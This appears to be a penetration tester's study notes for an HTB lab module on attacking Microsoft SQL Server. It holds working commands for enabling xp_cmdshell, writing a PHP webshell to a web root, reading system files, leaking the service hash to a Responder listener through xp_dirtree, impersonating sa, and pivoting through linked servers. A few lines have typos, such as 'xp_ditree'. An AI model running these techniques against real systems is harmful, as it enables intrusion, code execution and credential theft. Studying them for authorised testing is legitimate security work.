- **tags:** #common-services #sql #MSSQL
- --------------
# Enumeration
By default, MSSQL uses ports `TCP/1433` and `UDP/1434`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.
# Connection
From a *Linux* attacker box we can use 2 options: `impacket-mssqlclient` or `sqsh`
- *sqsh* sytnax:
```bash
# SQL Authentication
sqsh -S <ip> -U <username> -P <password> -h

# Windows Authentication
sqsh -S <ip> -U <DOMAIN or HOSTNAME>\\<username> -P <password> -h
```
**Note:** When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server.
- *impacket-mssqlclient* syntax:
```shell
impacket-mssqlclient username:password@targetIP
```
From a *Windows* host we can use the `sqlcmd` utility:
```shell
# -y and -Y are for better looking output
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
# Listing Content
```sql
/*Show Databases*/
SELECT name FROM master.dbo.sysdatabases
GO

/*Select a Database*/
USE htbusers
GO

/*List Tables*/
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO

/*Dump all Data in users table*/
SELECT * FROM users
```
# Execute Commands
*MSSQL* has a extended stored procedures called *xp_cmdshell* which *allow us to execute system commands using SQL*.
- **disabled by default**
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
```sql
/*Syntax*/
xp_cmdshell 'whoami'
go

/*enable xmp_cmdshell via sp_configure*/

-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO
-- To update the currently configured value for advanced options.  
RECONFIGURE
GO
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

RECONFIGURE
GO
```
**Note:** `impacket-mssqlclient` can automate the *xp_cmdshell* enabling process.
# Write Local Files
To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

/* Creating a Webshell */
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```
# Read Local Files
By default, `MSSQL` allows file read on any file in the operating system to which the account has read access.
```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
# Captruring MSSQL Service Hash
We can steal the *MSSQL* service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the *SMB* protocol to retrieve a list of child directories under a specified parent directory from the file system.
- Start a listener with *Responder*:
```bash
responder -I tun0
```
- Execute the *xp_dirtree* or *XP_SUBDIRS* undocumented stored procedure:
```sql
EXEC master..xp_ditree '\\<responderIP>\shares'
-- or directly 
exec xp_dirtree '\\<responderIP>\shares'
```
# Impersonate Existing Users
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
```sql
-- Enum Users that we can Impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
-- Verifying our Current User and Role (1-True 0-False)
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

-- Impersonating a User
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Reverting to Previous User
REVERT
GO
```
**Note**: `impacket-mssqlclient` can automate the impersonation process
# Linked DB
`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
```sql
-- 1 means is a remote server, and 0 is a linked server
select srvname, isremote FROM sysservers

-- executing commands on a linked server
exec ('select system_user, is_srvrolemember(''sysadmin'')') at [LOCAL.TEST.LINKED.SRV]
go
```
Note how we specify our command between *()* and the target linked server between *\[\]*.
### Resource Labs
- HTB Attacking Common Services (MSSQL) Module